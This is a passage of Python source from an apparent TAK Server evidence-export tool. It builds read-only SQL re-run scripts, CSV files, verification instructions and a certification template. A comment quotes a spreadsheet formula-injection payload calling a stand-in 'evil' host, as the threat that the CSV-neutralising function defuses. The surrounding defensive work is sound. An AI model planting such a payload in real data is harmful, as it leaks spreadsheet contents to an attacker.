    ("speed unavailable (-1.0)",
     "substring(detail from '<track[^>]*speed=\"([^\"]*)\"') IN ('-1.0','-1')"),
    ("speed measured as stationary (0.0)",
     "substring(detail from '<track[^>]*speed=\"([^\"]*)\"') = '0.0'"),
    ("course unavailable",
     "substring(detail from '<track[^>]*course=\"([^\"]*)\"') "
     "IN ('9999999.0','-1.0','-1')"),
    # Percent signs are DOUBLED here on purpose. This whole list is
    # spliced into a query that's executed WITH a parameter tuple, so
    # psycopg2 runs its own %-interpolation over the finished string
    # first - and a bare '%<' is not a valid format spec, so it raises
    # ValueError before Postgres ever sees the SQL. That exception was
    # being swallowed below, which silently turned every row of the
    # README's DATA QUALITY SUMMARY into "unavailable" on every single
    # export. Same rule already applied at cot_type_list LIKE 'a-%%'
    # above and in app.py's /api/count.
    ("no track element sent", "detail NOT LIKE '%%<track%%'"),
    ("horizontal accuracy unknown", "point_ce >= 9999999"),
    ("vertical accuracy unknown", "point_le >= 9999999"),
    ("altitude unknown", "point_hae >= 9999999"),
    ("no callsign sent", "detail NOT LIKE '%%<contact%%'"),
    ("no battery status sent", "detail NOT LIKE '%%<status%%'"),
    ("no device/version info sent", "detail NOT LIKE '%%<takv%%'"),
    ("no precision-location element", "detail NOT LIKE '%%<precisionlocation%%'"),
]


def quality_sql(chan_and, checks=None):
    """The single-pass DATA QUALITY SUMMARY statement.

    A plain count(*) rides along with the FILTER counts so the true number
    of matching positions is known even when cot.csv was excluded from the
    package - the audit log's record count should reflect what was in
    scope, not just what was zipped. The channel clause matches cot.csv's
    own WHERE exactly, so this describes the same rows cot.csv contains,
    not the pre-channel-filter set.

    Carries the doubled-%% hazard documented on QUALITY_CHECKS: this text
    must only ever be executed WITH a parameter tuple, never with None.
    """
    checks = QUALITY_CHECKS if checks is None else checks
    selects = ",\n               ".join(
        f"count(*) FILTER (WHERE {clause})" for _label, clause in checks
    )
    return f"""
                SELECT count(*),
                       {selects}
                FROM cot_router
                WHERE servertime >= %s::timestamptz
                  AND servertime <  %s::timestamptz
                  AND {REAL_POSITION}
                  AND event_pt && ST_MakeEnvelope(%s, %s, %s, %s, 4326)
                  AND cot_type <> 'b-t-f'
                  {chan_and};
            """


# Shape deletions: mission_change REMOVE_CONTENT (change_type 3) rows in the
# window, joined in Python to the shape versions that made it in. Verbatim
# the text build_package sends, so the schema check verifies the statement
# rather than a paraphrase of it.
SHAPE_DELETIONS_SQL = """SELECT ts, uid, creatoruid, mission_id FROM mission_change
                       WHERE change_type = 3
                         AND ts >= %s::timestamptz AND ts < %s::timestamptz
                       ORDER BY ts, id;"""


# Every TAK Server table this tool is granted SELECT on. The same list lives
# in connect-database.sh as `grant_tables` (shell cannot import Python) and
# in README.md's manual SQL block; tests/test_dbcheck.py asserts this copy and the
# installer's copy are equal, so the duplicate is a tested one rather than a
# remembered one.
GRANTED_TABLES = (
    "cot_router", "cot_router_chat", "cot_image", "cot_link", "cot_thumbnail",
    "groups", "client_endpoint", "client_endpoint_event", "connection_event_type",
    "mission", "mission_change", "mission_subscription", "mission_uid",
    "mission_resource", "mission_external_data", "mission_log", "mission_invitation",
    "resource", "video_connections", "video_connections_v2",
    "data_feed", "data_feed_cot", "data_feed_type_pl",
    "fed_event", "fed_event_kind_pl", "properties_uid",
)


def with_limit(sql, n):
    """`sql` with a LIMIT appended, matching what /api/preview has always
    done. Appended rather than wrapped in a sub-select: two of the queries
    end in a positional ORDER BY over a UNION ALL, and wrapping is a second
    place the text sent can differ from the text the exporter sends."""
    return sql.rstrip().rstrip(";") + f"\nLIMIT {n};"


# ---------------------------------------------------------------------------
# Package assembly
# ---------------------------------------------------------------------------

def available_channels_sql():
    """The statement _available_channels sends. Extracted so the schema
    check can execute the real text rather than keeping a copy of it."""
    return f"""
            SELECT gg.bitpos, gg.name
            FROM groups gg
            WHERE EXISTS (
                SELECT 1 FROM cot_router r
                WHERE servertime >= %s::timestamptz
                  AND servertime <  %s::timestamptz
                  AND {REAL_POSITION}
                  AND event_pt && ST_MakeEnvelope(%s, %s, %s, %s, 4326)
                  AND cot_type <> 'b-t-f'
                  AND substring(r.groups from (length(r.groups) - gg.bitpos) for 1) = B'1'
            )
            ORDER BY gg.bitpos;
        """


def available_channels_params(p):
    return (p["start"], p["end"], p["west"], p["south"], p["east"], p["north"])


def _available_channels(conn, p):
    """Channels actually present among matching positions in this window/
    area, as (bitpos, name) pairs. One EXISTS check per channel, not an
    aggregate bitwise OR - only the per-row substring comparison used
    elsewhere here has actually been verified against a live server (see
    NOTES.md), and typical channel counts are small enough that this stays
    cheap regardless.
    """
    with conn.cursor() as cur:
        cur.execute(available_channels_sql(), available_channels_params(p))
        return cur.fetchall()


# A cell beginning with one of these is treated as a FORMULA by Excel and
# LibreOffice, not text. The dangerous four are = + - @ (plus a leading tab
# or CR, which the same parsers also honour). Several exported columns are
# written by field devices - a TAK user chooses their own callsign, team,
# role and remarks, and chat.csv is message text - so a callsign of
#   =HYPERLINK("https://evil/"&A1,"OK")
# or a DDE launch string sits in a cell of an evidence package until whoever
# received it double-clicks the CSV, months later, and it runs.
# The attacker never needs access to this tool, only to have been on the
# TAK Server during the window.
_FORMULA_LEAD = ("=", "+", "-", "@", chr(9), chr(13))   # tab and CR, spelled out
_PLAIN_NUMBER = re.compile(r"^[+-]?\d+(\.\d+)?$")


def neutralize_csv_cell(v):
    """Defuse spreadsheet formula injection for one CSV cell.

    Only strings are touched - numbers, dates and None arrive from psycopg2
    as their own types and can't be formulas. A string that is simply a
    number (-1.0, -98.4123, +5) is left alone too: Excel reads that as a
    number, and prefixing it would silently corrupt every negative
    coordinate and sentinel in cot.csv. Anything else that would be parsed
    as a formula gets a leading apostrophe, which every spreadsheet reads
    as "this cell is text" and hides from view - the same convention used
    by every mainstream CSV-injection mitigation. Disclosed in the README's
    SENTINEL VALUES section, since it does alter the exported bytes.
    """
    if not isinstance(v, str):
        return v
    stripped = v.lstrip()          # Excel trims leading spaces before deciding
    if not stripped or stripped[0] not in _FORMULA_LEAD:
        return v
    if _PLAIN_NUMBER.match(stripped):
        return v
    return "'" + v


def _sql_literal(v):
    """Fallback literal rendering for render_statement() - only reached on a
    cursor without mogrify (the test harness's fake). Not used on a real
    psycopg2 connection, where mogrify's own rendering is authoritative."""
    if v is None:
        return "NULL"
    if isinstance(v, bool):
        return "TRUE" if v else "FALSE"
    if isinstance(v, (int, float)):
        return repr(v)
    if isinstance(v, (list, tuple)):
        return "ARRAY[" + ", ".join(_sql_literal(x) for x in v) + "]"
    return "'" + str(v).replace("'", "''") + "'"


def render_statement(cur, sql, params):
    """The statement with its bound values substituted - what the server
    actually received. psycopg2 renders parameters client-side, and
    cursor.mogrify() returns exactly those bytes without executing, so on a
    real connection this is the sent statement, not a reconstruction."""
    try:
        return cur.mogrify(sql, params).decode("utf-8")
    except AttributeError:
        return sql % tuple(_sql_literal(v) for v in (params or ()))


# What each re-run output is called, and what it corresponds to in the
# package. Files rendered in Python from a query's rows (shapes.csv, the
# in_shapes_export manifest column, locations.kmz) are named here so the
# reader knows which recheck file feeds which package file.
_RECHECK_NOTES = {
    "cot.csv": "Compare with cot.csv row for row (match on id). locations.kmz is\n"
               "-- rendered from these same rows.",
    "shapes.csv": "The SOURCE rows for shapes.csv: every version of every drawn object\n"
                  "-- in the time window, before the geometry-touches-box rule. shapes.csv\n"
                  "-- is derived from these by parsing raw_detail (shapes.py in the\n"
                  "-- tool's public source); the rows themselves are what to compare.",
    "shapes-deletions": "Deletion records joined to shapes.csv's 'deleted' rows.",
    "positions-plain.csv": "The plain query: same window and box, six readable lines. Compare with\n"
                           "-- positions-plain.csv, or load this output on the Verify page's Compare tab.",
    "cot_router-raw.csv": "Every column of cot_router for cot.csv's rows, as the server stores\n"
                          "-- them. Compare with cot_router-raw.csv (match on id).",
    "manifest.csv": "Compare with manifest.csv (match on uid). The in_shapes_export\n"
                    "-- column is added by the tool from the shapes result, not by SQL.",
}


def build_queries_sql(case_id, app_version, context, statements):
    """The re-run script: a psql-executable file. Each statement is preceded
    by \\o so its result lands in a recheck-<name>.csv beside the script."""
    header = f"""-- {case_id}-queries.sql
-- The SQL statements this export ran against the TAK Server database, with
-- the values that were bound to them, exactly as sent to the server.
-- Produced by {app_version} for case {case_id}.
--
-- WHY THIS FILE EXISTS
-- The rest of this package is what those statements returned. Re-running
-- them against the same database lets the results be compared with this
-- package directly, without relying on the tool. It is only possible while
-- the server still retains the data (see LIMITS OF THIS DATA in the README):
-- after the retention period the rows no longer exist and this package may
-- be the only copy.
--
-- HOW TO RE-RUN (needs psql 12 or newer for CSV output)
-- The usual way: right after the export, TAK-Extract's Export page shows ONE
-- line to paste on the TAK Server. It fetches this very file from TAK-Extract
-- (same bytes - its hash is in the package's SHA256SUMS.txt), runs it with
-- psql into /var/lib/takextract/recheck/{case_id}/<date>/, hashes every
-- result, tars the folder, and posts only the hash file back to TAK-Extract,
-- which records it in the audit log and answers with a RECHECK-INFO.txt.
--
-- By hand, if that page is not to hand. Every result is written as
-- {case_id}-recheck-<name>.csv in the folder psql is run from; the second
-- half of either line then writes one file listing every result's SHA-256.
-- Nothing here writes to the database: every statement is a SELECT.
--
-- A. On the TAK Server host, as the server's own postgres account, in the
--    re-check folder (created once by connect-database.sh):
--
--     D=/var/lib/takextract/recheck/{case_id}/$(date +%Y-%m-%dT%H-%M-%S) && mkdir -m 2770 -p "$D" && cd "$D" && cp ~/{case_id}-queries.sql . && sudo -u postgres psql -d cot -f {case_id}-queries.sql && sha256sum {case_id}-queries.sql {case_id}-recheck-*.csv {case_id}-recheck-snapshot.txt > {case_id}-recheck-SHA256SUMS.txt
--
-- B. From any machine with psql that can reach the database - including
--    when Postgres runs in a container or on another server - as the
--    read-only role this tool uses (its password is prompted for; the
--    package README names the account, host and port):
--
--     psql -h <host> -p <port> -U <account> -d cot -f {case_id}-queries.sql && sha256sum {case_id}-queries.sql {case_id}-recheck-*.csv {case_id}-recheck-snapshot.txt > {case_id}-recheck-SHA256SUMS.txt
--
-- /tmp is not a place for evidence: it is cleared on reboot.
--
-- WHAT TO COMPARE
-- ONE line is expected to match the package exactly: the hash of
-- recheck-cot_router-raw.csv should equal the {case_id}-cot_router-raw.csv
-- line in the package's SHA256SUMS.txt. That file is written by this tool the
-- way psql writes CSV, with every value cast to text by the server, so the
-- same rows produce the same bytes. If the two hashes match, the file the
-- server wrote today and the file in this package have the same hash - and no
-- tool was involved in saying so.
-- The other recheck files are not compared by hash. Compare them by CONTENT:
-- the package's CSVs carry a spreadsheet-safety guard (a leading apostrophe
-- on cells beginning with = + - @) and Python's spelling of
-- timestamps and booleans, psql's do not, so identical rows give different
-- bytes. Eight of the package's files are not limited by time either, so
-- they change between an export and a re-check for ordinary reasons - the
-- package README says which, under WHAT THE RE-CHECK COMPARES. Load them on the Verify & Replay page, or compare
-- rows by id with a database tool. recheck-shapes.csv and recheck-manifest.csv
-- are the SOURCE rows for files the tool derives in Python.
--
-- The time window is interpreted in the database's timezone, set below to
-- the value in force when the export ran so the re-run reads the same rows.
--
-- The whole script runs in ONE read-only transaction at REPEATABLE READ,
-- so every recheck file describes the database at a single instant - the
-- same guarantee the package itself was built under - and that snapshot's
-- id, the database clock and the account are written to
-- recheck-snapshot.txt. ON_ERROR_ROLLBACK keeps one failed statement from
-- spoiling the rest.

\\set ON_ERROR_STOP off
\\set ON_ERROR_ROLLBACK on
\\pset format csv
\\pset null ''
BEGIN ISOLATION LEVEL REPEATABLE READ READ ONLY;
SET timezone = '{str(context.get("db_timezone", "UTC")).replace("'", "''")}';
\\o {case_id}-recheck-snapshot.txt
SELECT txid_current_snapshot() AS snapshot, now() AS db_clock, current_user AS db_account;
\\o

"""
    parts = [header]
    for name, rendered in statements:
        out = f"{case_id}-recheck-" + name.replace(".csv", "") + ".csv"
        note = _RECHECK_NOTES.get(name, f"Compare with {name}.")
        parts.append(f"-- ===================== {name} =====================\n"
                     f"-- {note}\n"
                     f"\\o {out}\n{rendered.rstrip().rstrip(';')};\n\\o\n\n")
    parts.append("COMMIT;\n-- End of re-run script.\n")
    return "".join(parts)


# The plain query: the same window and box asked in the simplest form
# anyone can read - no PostGIS envelope, no channel decoding, no type
# exclusions. Deliberately a superset of cot.csv (no channel filter, keeps
# b-t-f rows): every cot.csv position must appear in it, and the Verify
# page reports the rest as expected coverage. The callsign extraction is
# the one non-obvious line, kept because it is what the comparison matches
# devices on.
PLAIN_POSITIONS_SQL = """
    SELECT id, uid,
           substring(detail from '<contact[^>]*callsign="([^"]*)"') AS callsign,
           servertime,
           ST_Y(event_pt) AS latitude,
           ST_X(event_pt) AS longitude
    FROM cot_router
    WHERE servertime >= %s::timestamptz
      AND servertime <  %s::timestamptz
      AND event_pt IS NOT NULL
      AND ST_Y(event_pt) BETWEEN %s AND %s
      AND ST_X(event_pt) BETWEEN %s AND %s
    ORDER BY servertime, id
"""


def plain_positions_params(p):
    return (p["start"], p["end"], p["south"], p["north"], p["west"], p["east"])


# The raw rows: every column of cot_router as the server stores it, for
# exactly the rows cot.csv holds (same filter, same instant), plus readable
# latitude/longitude at the end because event_pt itself comes out as the
# server's hex-encoded geometry. Nothing parsed, nothing renamed.
COT_ROUTER_COLUMNS_SQL = """SELECT column_name FROM information_schema.columns
                            WHERE table_schema = 'public' AND table_name = 'cot_router'
                            ORDER BY ordinal_position;"""


def cot_router_columns(conn):
    """cot_router's column names in table order, from the catalogue.

    Returns (columns, error). An empty list with no error is the test
    harness, which has no catalogue to read; an empty list WITH an error is
    a real failure, and the caller must record it rather than quietly
    shipping the r.* fallback - that fallback produces a file which is not
    byte-comparable, so the one hash the re-check exists to match cannot
    match, and before this returned an error nothing anywhere said so."""
    try:
        with conn.cursor() as cur:
            cur.execute(COT_ROUTER_COLUMNS_SQL)
            return [r[0] for r in cur.fetchall() if r and r[0]], None
    except Exception as e:
        return [], f"{type(e).__name__}: {e}"


def raw_rows_sql(chan_and, columns=None):
    """Every column cast to text by the server itself (`"col"::text`), so
    psql and this tool receive identical strings and neither spells a value.
    With no column list (harness), falls back to r.* - typed values, not
    byte-identical, which only the harness sees."""
    if columns:
        cols = ",\n           ".join(f'r."{c}"::text AS "{c}"' for c in columns)
        select = (f"SELECT {cols},\n           ST_Y(r.event_pt)::text AS latitude,"
                  f"\n           ST_X(r.event_pt)::text AS longitude")
    else:
        select = "SELECT r.*, ST_Y(r.event_pt) AS latitude, ST_X(r.event_pt) AS longitude"
    return f"""
    {select}
    FROM cot_router r
    WHERE servertime >= %s::timestamptz
      AND servertime <  %s::timestamptz
      AND {REAL_POSITION}
      AND event_pt && ST_MakeEnvelope(%s, %s, %s, %s, 4326)
      AND cot_type <> 'b-t-f'
      {chan_and}
    ORDER BY r.servertime, r.id
"""


def _certification_recheck(case_id, recheck):
    """Section 4, filled from the re-check's own audit row where there is
    one. No row means no re-check was run - which is a fact to state, not
    a gap to leave blank lines for: the package stands without it."""
    if not recheck:
        return ("   No re-check is recorded for this package in the audit log.\n"
                "   If one is run later, it is recorded there and this section can be\n"
                "   produced again from Verify & Replay with its results filled in.")

    def clause(key):
        m = re.search(r"(?:^|; )" + re.escape(key) + r": ([^;]+)", recheck.get("detail") or "")
        return m.group(1).strip() if m else None

    def named(key):
        # (?:^|; ) is not decoration. Without a clause boundary this matched
        # anywhere in the detail and re.search takes the LEFTMOST hit - and
        # the first clause of a re-check detail is "re-check at <where>",
        # built from a field the token holder posts. Spaces were allowed
        # there, so "hash file x sha256 <64 hex>" inside it won, and the
        # certification printed hashes the poster chose while the ones the
        # route recorded never appeared. Same anchoring as clause() above.
        m = re.search(r"(?:^|; )" + re.escape(key) + r" (\S+) sha256 ([0-9a-f]{64})",
                      recheck.get("detail") or "")
        return m.group(2) if m else None

    # "re-check at <host:path>" carries no colon after "at", unlike every
    # other clause in that detail - so it needs its own match, not clause().
    # Not \S+: the clause separator is "; " and ";" is not whitespace, so a
    # greedy match carries the semicolon into the path.
    _where = re.search(r"(?:^|; )re-check at ([^;\s]+)", recheck.get("detail") or "")
    where = _where.group(1) if _where else NOT_RECORDED
    script = clause("SQL query script match") or clause("script match") or NOT_RECORDED
    raw = clause("raw table rows match") or clause("cot_router-raw.csv match") or NOT_RECORDED
    sums_hash = named("hash file") or "_" * 64
    tgz_hash = named("archive") or "_" * 64
    return f"""   Recorded           : {recheck.get('ts_local') or NOT_RECORDED}
   Recorded under     : {recheck.get('actor') or NOT_RECORDED}
   Files kept at      : {where}
   {case_id}-recheck-SHA256SUMS.txt   SHA-256 : {sums_hash}
   {case_id}-recheck.tgz               SHA-256 : {tgz_hash}

   What it compared, and what it did not:
     the SQL query script ({case_id}-queries.sql)          : {script}
     the raw table rows ({case_id}-recheck-cot_router-raw.csv) : {raw}
     every other file it produced was recorded, not compared - this tool and
     psql write CSV differently, and eight of the package's files are not
     limited by time, so they change between an export and a re-check for
     ordinary reasons. Those files remain on the server.

   (the same facts are in the folder's RECHECK-INFO.txt and in the audit log)"""


def read_source_identity(conn, context, cur=None):
    """Which database this connection is talking to, into context.

    Two identifiers, because they are not equally available:

    - the cluster's own `system_identifier`, fixed when the cluster was
      created by initdb and unchanged by restarts, address changes or TAK
      Server upgrades. `pg_control_system()` carries no privilege list of
      its own on a stock cluster, so Postgres's default applies and any
      role can call it - most installs have this without being granted
      anything. It CAN be revoked, so it is never assumed: the call sits
      behind a SAVEPOINT and the catalog identifiers below are the
      fallback. (An earlier version of this docstring said superuser-only.
      Measured instead: pg_proc.proacl is NULL for it on PostgreSQL 18.)
    - catalog identifiers - the database's name and OID, and cot_router's
      OID - which any role can read. Weaker: small integers that two
      unrelated servers could match by chance.

    Safe to call inside the export's snapshot transaction. The catalog
    query uses sub-selects so a missing table yields NULL instead of
    raising, and the privileged one sits behind a SAVEPOINT - in Postgres
    a permission error aborts the whole transaction, and that transaction
    is what guarantees every file in a package read one instant.
    """
    own_cursor = cur is None
    c = conn.cursor() if own_cursor else cur
    try:
        c.execute("""SELECT current_database(),
                            (SELECT oid FROM pg_database
                              WHERE datname = current_database()),
                            (SELECT oid FROM pg_class
                              WHERE relname = 'cot_router' AND relkind = 'r'
                              LIMIT 1);""")
        db, dboid, reloid = c.fetchone()
        context["db_catalog_id"] = f"{db}/{dboid}/{reloid}"
        c.execute("SAVEPOINT takx_cluster_id;")
        try:
            c.execute("SELECT system_identifier::text FROM pg_control_system();")
            context["db_cluster_id"] = c.fetchone()[0]
            c.execute("RELEASE SAVEPOINT takx_cluster_id;")
        except Exception as e:
            # Ordinary: the grant is optional. Recorded so the System page
            # can say WHY only the weaker fingerprint is available.
            context["db_cluster_id_error"] = f"{type(e).__name__}"
            c.execute("ROLLBACK TO SAVEPOINT takx_cluster_id;")
            c.execute("RELEASE SAVEPOINT takx_cluster_id;")
    finally:
        if own_cursor:
            try:
                c.close()
            except Exception:
                pass
    return context


def _identity_text(context):
    """The README's line for it. Says which kind of identifier it is and
    what that is worth, because the two are not worth the same and a
    reader has no way to tell them apart from the value."""
    if context.get("db_cluster_id"):
        return (f"cluster {context['db_cluster_id']}\n"
                "                   (the database cluster's own identifier, fixed when it was\n"
                "                   created; it survives restarts, address changes and TAK\n"
                "                   Server upgrades. A package from a different cluster shows a\n"
                "                   different value - which can simply mean the server was\n"
                "                   rebuilt or restored, so a difference is not by itself a\n"
                "                   sign that anything is wrong. A replica of a cluster reports\n"
                "                   the same value as the cluster it copies.)")
    if context.get("db_catalog_id"):
        return (f"catalog {context['db_catalog_id']}\n"
                "                   (database name and catalog ids - a weaker fingerprint used\n"
                "                   because this export's account could not read the cluster's\n"
                "                   own identifier. These are small numbers and two unrelated\n"
                "                   servers could produce the same ones by chance.)")
    return NOT_RECORDED


def source_identity(context):
    """How the database this was read from identified itself, as one short
    string - and which of the two kinds it is, because they are not worth
    the same.

    "cluster <n>" is the cluster's own system_identifier, fixed when it was
    created; "catalog <db>/<oid>/<oid>" is a fallback built from catalog
    identifiers any role can read, which is weaker: those are small
    integers and two unrelated servers could produce the same one by
    chance. Never guess between them - the caller prints which it got.
    """
    if context.get("db_cluster_id"):
        return f"cluster {context['db_cluster_id']}"
    if context.get("db_catalog_id"):
        return f"catalog {context['db_catalog_id']}"
    return ""


def build_verify_txt(case_id, app_version, app_commit, context, file_count):
    """The one page for whoever has this package and not the tool.

    Everything else in here is about the DATA - what it means, where it
    came from, what it does not cover. This file is only about whether the
    package is what it says it is, so that the question has one answer in
    one place instead of three README sections, a SQL header and a form.
    Says what was done and what can be checked; claims nothing beyond it.
    """
    return f"""HOW TO CHECK THIS PACKAGE
===============================================================================
{case_id}
Produced by {app_version}{(', commit ' + app_commit) if app_commit else ''}
Built {context.get('tool_now', 'unknown')} (tool clock)

There are two questions, and they have different answers.


1. ARE THESE THE FILES THIS PACKAGE WAS BUILT WITH?
-------------------------------------------------------------------------------
Every one of the {file_count} files was hashed when the package was built, and
those hashes are listed in {case_id}-SHA256SUMS.txt. One command checks all of
them at once:

    Linux or macOS, in the folder holding these files:
        sha256sum -c {case_id}-SHA256SUMS.txt

    Windows PowerShell, one file at a time:
        Get-FileHash -Algorithm SHA256 {case_id}-cot.csv
    and compare it with that file's line in {case_id}-SHA256SUMS.txt.

Every line should report OK. A line that does not means that file is not the
one the list was written for.

{case_id}-SHA256SUMS.txt is not in its own list - it IS the list. What covers
it is the hash of the zip, below.

Opening a CSV in Excel and saving it changes that file's hash. Work on copies
and leave the originals alone.


2. IS THIS THE PACKAGE THE TOOL RECORDED BUILDING?
-------------------------------------------------------------------------------
The hash of the zip itself was calculated by TAK-Extract before the file was
handed over, and written to its audit log at that moment, with who exported
it, when, for whom, and the window and area they asked for.

    Whoever has access to that TAK-Extract: open Verify & Replay and drop
    the zip on it. The page hashes it in your browser - the file is not
    uploaded - and reports what the log holds for that hash, and whether
    every file inside matches the list from section 1.

    Whoever does not: calculate the zip's SHA-256 and ask the agency that
    produced it what their audit log records for that value.

Section 1 shows the files agree with the list that shipped beside them.
Section 2 is what ties that list to the tool that built it.


WHAT THIS DOES NOT SHOW
-------------------------------------------------------------------------------
Neither check says anything about whether the underlying records are
accurate or complete - only that these files are the ones that were
produced, unchanged since. What the data does and does not cover is in
{case_id}-README.txt, and the exact statements that produced it are in
{case_id}-queries.sql, which can be run again on the TAK Server.

Where an administrator's re-check was run, what it compared and what it
only recorded is set out in the README under WHAT THE RE-CHECK COMPARES.
===============================================================================
"""


def build_certification(case_id, facts, file_hashes, package_sha256=None, recheck=None):
    """A certification with an export's facts and every file's hash.

    Takes plain facts rather than export-time objects, because the only
    caller is the Verify page, working from the audit log after the fact:
    by then the zip's own hash and the re-check's results exist, and used
    to be underscores for someone to copy 64-character values into by
    hand. This fills them in. Only the declaration and the signature are
    left for a person.

    facts:        produced_by / exported / exported_by / requested_for /
                  source - each a string already phrased for its line.
    file_hashes:  (filename, sha256) pairs, already named as they are in
                  the package; empty for an export recorded before 1.17.0,
                  which did not record its file list.
    recheck:      the re-check's audit row as a dict, or None.
    """
    if file_hashes:
        hashes = "\n".join(f"  {h}  {n}" for n, h in sorted(file_hashes))
    else:
        hashes = ("  This export predates the recording of per-file hashes, so the\n"
                  "  audit log holds only the hash of the package as a whole\n"
                  "  (section 3). The per-file list is inside the package itself,\n"
                  f"  as {case_id}-SHA256SUMS.txt.")
    return f"""CERTIFICATION OF RECORDS - TEMPLATE
===============================================================================
This is a template. The facts below were taken from TAK-Extract's audit log,
which recorded them when the package was built. The declaration wording is a
starting point only: adapt it with counsel to the rules of the court or
proceeding it is for. Nothing here is legal advice.

1. THE RECORDS
   Case / reference   : {case_id}
   Produced by        : {facts.get('produced_by') or NOT_RECORDED}
   Exported           : {facts.get('exported') or NOT_RECORDED}
   Exported by        : {facts.get('exported_by') or NOT_RECORDED}
   Requested for      : {facts.get('requested_for') or NOT_RECORDED}
   Source             : {facts.get('source') or NOT_RECORDED}

2. FILES IN THE PACKAGE AND THEIR SHA-256 HASHES (as built)
{hashes}

3. THE PACKAGE ITSELF
   SHA-256 of the zip : {package_sha256 or '_' * 64}
   (calculated by TAK-Extract before the package was handed over and recorded
   in its audit log at that moment; recompute it with any standard utility)

4. THE ADMINISTRATOR'S RE-CHECK - corroboration, over and above the standard;
   a package without one is not deficient (see the README)
{_certification_recheck(case_id, recheck)}

5. DECLARATION (adapt with counsel)
   I, ______________________________, ______________________________ (title),
   declare that: the records listed above were produced from the TAK Server
   database by the process described in section 1 and in the package README;
   that process is one I am familiar with and that produces accurate copies
   of the records it reads; the hash values in section 2 were calculated when
   the package was built and the hash in section 3 identifies the package as
   delivered; and [if section 4 applies] I ran the re-check described in
   section 4 myself on the server on the date shown and recorded its results.

   Signature : ______________________________   Date : ____________________
===============================================================================
"""


def psql_csv(headers, rows):
    """CSV exactly as psql's `\\pset format csv` writes it (src/fe_utils/
    print.c, csv_print_field): a field is quoted only if it contains the
    separator, a double quote, CR or LF, or is exactly `\\.`; quotes inside
    are doubled; NULL is empty; header row plain; LF line ends. Values are
    written as given - the raw query already had the server cast every
    column to text, so there is nothing here to spell."""
    def field(v):
        if v is None:
            return ""
        t = v if isinstance(v, str) else str(v)
        if "," in t or '"' in t or "\n" in t or "\r" in t or t == "\\.":
            return '"' + t.replace('"', '""') + '"'
        return t
    out = [",".join(field(h) for h in headers)]
    for row in rows:
        out.append(",".join(field(v) for v in row))
    return "\n".join(out) + "\n"


def _rows_to_csv(headers, rows, neutralize=True):
    """neutralize=False writes cells exactly as the database returned them
    - for cot_router-raw.csv, whose purpose is fidelity; the README says it
    is not spreadsheet-safe. Every other CSV keeps the guard."""
    buf = io.StringIO(newline="")
    w = csv.writer(buf)
    w.writerow(headers)
    for row in rows:
        w.writerow([neutralize_csv_cell(v) for v in row] if neutralize else list(row))
    return buf.getvalue()


# ---- one snapshot for the whole package -----------------------------------
# Every statement in a package reads the database at the same instant:
# the transaction is REPEATABLE READ (Postgres serves every statement
# from the snapshot taken at the first one) and READ ONLY (the server
# itself refuses a write, whatever the account could do). The snapshot's
# id, the database's own clock, the account and its privileges are read
# in the same transaction and go into the README. A rollback ends the
# transaction, so every failure path restarts the snapshot through
# _rollback_and_restart() and the README says how many times that
# happened (normally none).

def begin_snapshot(conn, context):
    ctx = {}
    try:
        # psycopg2 opens a transaction on the first statement of a
        # connection, and the caller may already have run one (the audit
        # timezone lookup does). SET TRANSACTION must be the first
        # statement of ITS transaction, so end whatever is open first - on
        # a fresh connection this is a no-op.
        conn.rollback()
        with conn.cursor() as cur:
            cur.execute("SET TRANSACTION ISOLATION LEVEL REPEATABLE READ READ ONLY;")
            cur.execute("SELECT txid_current_snapshot()::text, now(), current_user;")
            row = cur.fetchone()
            if row and len(row) >= 3:
                ctx["snapshot"], ctx["db_now"], ctx["db_user"] = str(row[0]), row[1], str(row[2])
            cur.execute("""SELECT has_table_privilege(current_user, 'cot_router', 'INSERT'),
                                  has_table_privilege(current_user, 'cot_router', 'UPDATE'),
                                  has_table_privilege(current_user, 'cot_router', 'DELETE'),
                                  has_table_privilege(current_user, 'cot_router', 'TRUNCATE');""")
            row = cur.fetchone()
            if row and len(row) == 4 and all(isinstance(v, bool) for v in row):
                granted = [n for n, v in zip(("INSERT", "UPDATE", "DELETE", "TRUNCATE"), row) if v]
                ctx["write_privs"] = ", ".join(granted) if granted else "none"
    except Exception as e:
        try:
            conn.rollback()
        except Exception:
            pass
        ctx["snapshot_error"] = f"{type(e).__name__}: {e}"
    context.setdefault("snapshots", []).append(ctx.get("snapshot", "unavailable"))
    for k, v in ctx.items():
        context.setdefault(k, v)
    context["tool_now"] = datetime.now(timezone.utc)


def _rollback_and_restart(conn, context):
    conn.rollback()
    context["snapshot_restarts"] = context.get("snapshot_restarts", 0) + 1
    begin_snapshot(conn, context)


def schema_check_result(conn, baseline):
    """Did the database's shape still match the recorded baseline when this
    package was built?

    Catalogue reads only, inside the snapshot the export already holds, so
    it costs nothing and reads the same instant every file did. Imported
    here rather than at module scope because dbcheck imports this module;
    the same late-import the KMZ builder uses.

    Never raises and never fails an export: a package with a shouting
    README beats no package on a deadline. "unavailable" with a reason is
    the worst it returns.
    """
    try:
        import dbcheck
        fp = dbcheck.fingerprint(conn)
    except Exception as e:
        return {"state": "unavailable", "detail": f"{type(e).__name__}: {e}"}
    result = {"state": "checked", "sha256": dbcheck.fingerprint_sha256(fp)}
    if not baseline:
        result["state"] = "no baseline"
        return result
    try:
        changes = dbcheck.diff_fingerprint(baseline, fp)
    except Exception as e:
        return {"state": "unavailable", "sha256": result.get("sha256"),
                "detail": f"{type(e).__name__}: {e}"}
    result["baseline_sha256"] = dbcheck.fingerprint_sha256(baseline)
    result["changes"] = [c["detail"] for c in changes]
    result["state"] = "matches baseline" if not changes else "differs from baseline"
    return result


def _schema_text(summary_schema):
    """The README header's line about it, with the differences listed under
    it when there are any. Indented to sit in the same column as the other
    values in that block."""
    s = summary_schema or {}
    state = s.get("state")
    pad = "\n" + " " * 19
    if state == "matches baseline":
        return ("unchanged since this tool was connected" + pad
                + "(tables, columns, types and geometry columns compared)")
    if state == "differs from baseline":
        changes = s.get("changes", [])
        shown = changes[:10]
        lines = pad.join(f"  - {c}" for c in shown)
        more = (pad + f"  ... and {len(changes) - len(shown)} more"
                if len(changes) > len(shown) else "")
        return (f"{len(changes)} difference(s) since this tool was connected:"
                + pad + lines + more + pad
                + "A difference is not by itself a sign that anything here is"
                + pad + "wrong - an upgrade changes structure legitimately. It is"
                + pad + "recorded so that it is known rather than assumed.")
    if state == "no baseline":
        return ("no earlier record of the structure to compare against" + pad
                + "(the structure as it was is recorded in the audit log)")
    # A psycopg2 message is routinely multi-line ("LINE 1:" and a caret),
    # and this sits inside a fixed-width header block whose other lines
    # state the source database and the account's write privileges.
    # Flattened so it cannot look like one of them.
